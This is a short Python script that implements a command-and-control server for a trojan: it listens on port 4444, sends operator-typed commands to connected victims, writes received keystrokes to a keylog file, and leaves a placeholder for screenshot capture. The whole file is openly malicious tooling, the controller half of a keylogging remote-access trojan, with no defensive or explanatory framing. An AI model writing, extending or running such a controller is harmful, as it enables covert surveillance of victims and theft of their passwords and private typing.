import socket
import ssl
import threading

# Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444

def handle_client(conn, addr):
    print(f"Connection from {addr} established.")
    while True:
        try:
            command = input("Enter command to send to Trojan: ")
            conn.sendall(command.encode())
            if command == "send_keystrokes":
                keystrokes = conn.recv(4096).decode()
                with open('keylog.txt', 'a') as f:
                    f.write(keystrokes)
            elif command.startswith("screenshot"):
                # Handle screenshot retrieval
                pass  # You can add specific screenshot handling here
        except Exception as e:
            print(f"Error: {e}")
            break
    conn.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"Listening on {HOST}:{PORT}")

    while True:
        conn, addr = server_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.start()

if __name__ == "__main__":
    start_server()
